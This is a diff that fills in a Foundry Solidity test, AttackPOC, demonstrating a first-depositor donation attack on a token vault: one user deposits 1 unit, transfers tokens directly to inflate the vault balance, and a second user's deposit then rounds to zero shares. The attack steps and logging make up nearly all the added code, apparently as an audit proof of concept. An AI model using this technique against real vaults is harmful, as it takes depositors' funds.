@@ -45,6 +45,8 @@ contract Vault {
     }
 }
 
+uint8 constant DECIMALS = 18;
+
 contract AttackPOC is Test {
     Vault vault;
     Token token; 
@@ -54,13 +56,41 @@ contract AttackPOC is Test {
     function setUp () public {
         token = new Token();
         vault = new Vault();
+
+
+        // fill the tokens and put approvals so its not a problem for the demo
+        for (uint i=0;i<users.length;i++) {
+            token.mint(users[i], 10000 * (10 ** DECIMALS));
+            vm.prank(users[i]);
+            token.approve(address(vault), type(uint256).max);
+        }
     }
 
     function test() public {
+        // normal deposit
+        vm.startPrank(users[0]);
+        vault.deposit(1);
+        print();
 
-    }
+        // we do a donation to inflate the vaults balance
+        token.transfer(address(vault), 100 * (10**DECIMALS));
+        vm.stopPrank();
+        print();
+
+        // user 1 wont be able to get his shares due to rounding issues
+        vm.prank(users[1]);
+        vault.deposit(100 * (10 ** DECIMALS));
+        print();
+    }   
 
     function print() private {
-
+        console2.log("vault total supply", vault.totalSupply());
+        console2.log("vault balance", token.balanceOf(address(vault)));
+        uint256 shares0 = vault.balanceOf(users[0]);
+        uint256 shares1 = vault.balanceOf(users[1]);
+        console2.log("users[0] shares", shares0);
+        console2.log("users[1] shares", shares1);
+        console2.log("users[0] redeemable", vault.previewRedeem(shares0));
+        console2.log("users[1] redeemable", vault.previewRedeem(shares1));
     }
 }
